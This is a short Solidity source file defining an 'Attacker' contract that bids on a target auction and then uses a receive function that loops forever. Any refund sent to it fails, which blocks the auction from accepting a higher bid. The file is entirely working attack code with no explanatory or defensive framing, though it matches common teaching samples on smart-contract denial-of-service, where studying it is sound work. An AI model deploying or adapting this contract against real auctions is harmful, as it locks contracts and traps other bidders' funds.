// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IAuction {
    function bid() external payable;
}

contract Attacker {
    function attack(address payable _target) external payable {
        IAuction(_target).bid{value: msg.value}();
    }
    receive() external payable {
        while(true) {}
    }
    
}